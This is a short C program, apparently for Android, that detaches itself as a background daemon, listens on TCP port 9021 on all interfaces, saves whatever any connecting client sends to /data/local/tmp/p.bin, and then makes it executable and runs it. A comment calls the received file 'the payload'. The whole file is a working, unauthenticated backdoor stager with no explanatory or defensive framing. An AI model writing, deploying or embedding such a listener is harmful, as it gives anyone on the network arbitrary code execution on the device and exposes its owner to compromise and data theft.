#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 9021

void make_daemon() {
    if (fork() != 0) exit(0);
    setsid();
    signal(SIGHUP, SIG_IGN);
}

int main() {
    make_daemon(); // Essential for Android 14 stability

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_addr.s_addr = INADDR_ANY, .sin_port = htons(PORT) };
    
    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 5);

    while (1) {
        int client = accept(server_fd, NULL, NULL);
        char path[] = "/data/local/tmp/p.bin";
        FILE *f = fopen(path, "wb");
        
        char buf[1024];
        int n;
        while ((n = recv(client, buf, 1024, 0)) > 0) fwrite(buf, 1, n, f);
        
        fclose(f);
        close(client);

        // Execute the payload in the background
        system("chmod +x /data/local/tmp/p.bin");
        system("/data/local/tmp/p.bin &");
    }
    return 0;
}
